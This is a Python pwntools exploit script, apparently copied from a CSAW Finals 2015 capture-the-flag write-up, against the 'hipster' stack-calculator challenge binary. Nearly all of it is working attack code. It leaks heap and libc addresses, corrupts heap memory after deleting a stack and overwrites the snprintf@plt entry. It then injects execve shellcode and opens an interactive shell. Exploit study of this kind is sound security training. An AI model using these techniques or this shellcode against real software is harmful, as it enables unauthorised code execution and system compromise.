"""
c/o https://github.com/aweinstock314/aweinstock-ctf-writeups/blob/master/csaw_finals_2015/exploitation250_hipster/exploitation250_hipster_exploit.py
"""
#!/usr/bin/env python
from pwn import *
#import IPython
import struct

sys.stdout.flush = lambda *args, **kwargs: () # hack for IPython/pwntools integration

p = process('./hipster') if '--live' not in sys.argv else remote('0.0.0.0', 8025)

waitprompt = lambda p: p.recvuntil(['==> '])

def emit_pow2(p, i):
    waitprompt(p)
    p.sendline('1')
    for _ in range(i):
        waitprompt(p)
        p.sendline(str(2))
        waitprompt(p)
        p.sendline('*')

def emit_arbitrary(p, x):
    waitprompt(p)
    p.sendline('0')
    for (i, b) in enumerate(reversed(bin(x)[2:])):
        if b == '1':
            emit_pow2(p, i)
            waitprompt(p)
            p.sendline('+')

def getleak(p):
    print(waitprompt(p))
    p.sendline(':top')
    r = '(\\d*)\n'
    s = p.recvregex(r)
    print(repr(s))
    heapleak = int(re.findall(r, s)[0],10)
    print(hex(heapleak))
    print("x/92wx 0x%x" % (heapleak-0x10,))
    return heapleak

disp2nums = lambda s: [int(x, 10) for x in re.findall('\|(-?[0-9]*)', s)]

#gdb.attach(p)

for _ in range(3):
    print(waitprompt(p))
    p.sendline(':new')

print(waitprompt(p))
p.sendline(':next')

heapleak = getleak(p)

for _ in range(0xa8/4 - 1):
    waitprompt(p)
    p.sendline('5')

emit_arbitrary(p, 0x000000b1)
emit_arbitrary(p, 0x41414141)
emit_arbitrary(p, 0x42424242)

# delete stack1
print(waitprompt(p))
p.sendline(':next')
print(waitprompt(p))
p.sendline(':del')

# leak some heap metadata via stack0
print(waitprompt(p))
p.sendline(':next')
print(waitprompt(p))
p.sendline(':disp')
has_libc_addrs = waitprompt(p)
libc_leak = disp2nums(has_libc_addrs)[-1] % (2**32)
print(hex(libc_leak))
libc_system = libc_leak - 0xf76cc450 + 0xf7564360
print(hex(libc_system))

print(disp2nums(has_libc_addrs))

# allocate a new stack2 in orig. stack1's memory (orig. stack2 is called stack1, but keeps its memory)
p.sendline(':new')
# switch to stack0, leak more metadata
print(waitprompt(p))
p.sendline(':next')
print(waitprompt(p))
p.sendline(':disp')
more_metadata = waitprompt(p)
print(disp2nums(more_metadata))

# set stack2's stack counter to snprintf@plt
p.sendline('0')
print(waitprompt(p))
p.sendline('*')
emit_arbitrary(p, 0x804b848)
print(waitprompt(p))
p.sendline('+')

# swap to stack1, emit shellcode
print(waitprompt(p))
p.sendline(':next')

shellcode = 'b8d08c97ff83f0ff50b8d09d969183f0ff5089e331c931d231c0b00bcd80'.decode('hex')
nums = struct.unpack("<"+"I"*(1+len(shellcode)/4), "\x90\x90"+shellcode)
for num in nums:
    emit_arbitrary(p, num)


# swap to stack2, point snprintf@plt at stack1's memory
print(waitprompt(p))
p.sendline(':next')
emit_arbitrary(p, (heapleak - 0x969a010) + 0x969a170)

# trigger snprintf
p.sendline(':top')

#IPython.embed()
p.interactive()
